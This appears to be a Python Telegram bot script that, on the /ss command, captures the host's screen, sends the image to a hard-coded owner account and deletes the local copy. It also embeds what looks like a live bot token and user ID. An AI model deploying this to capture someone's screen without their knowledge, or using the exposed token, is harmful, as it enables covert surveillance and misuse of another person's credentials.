import pyautogui
from datetime import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import logging
import os  # Importing os module to handle file deletion

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8093389141:AAE5U0DCAUrt42-R7_Sm-NYOHqRaMpWXJRU"
OWNER_ID = 6554270458

async def ss_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id != OWNER_ID:
            await update.message.reply_text("Access Denied")
            return

        filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        image = pyautogui.screenshot()
        image.save(filename)

        # Sending the screenshot
        with open(filename, 'rb') as photo:
            await context.bot.send_photo(chat_id=OWNER_ID, photo=photo)

        # Log info and delete the file after sending
        logger.info("Screenshot sent")
        
        # Delete the file after sending
        os.remove(filename)  
        logger.info(f"Deleted the screenshot: {filename}")

    except Exception as e:
        logger.error(f"Error: {e}")
        await update.message.reply_text(f"Error: {e}")

def main():
    try:
        app = ApplicationBuilder().token(BOT_TOKEN).build()
        app.add_handler(CommandHandler("ss", ss_command))
        logger.info("Starting bot...")
        app.run_polling()
    except Exception as e:
        logger.error(f"Error: {e}")

if __name__ == "__main__":
    main()
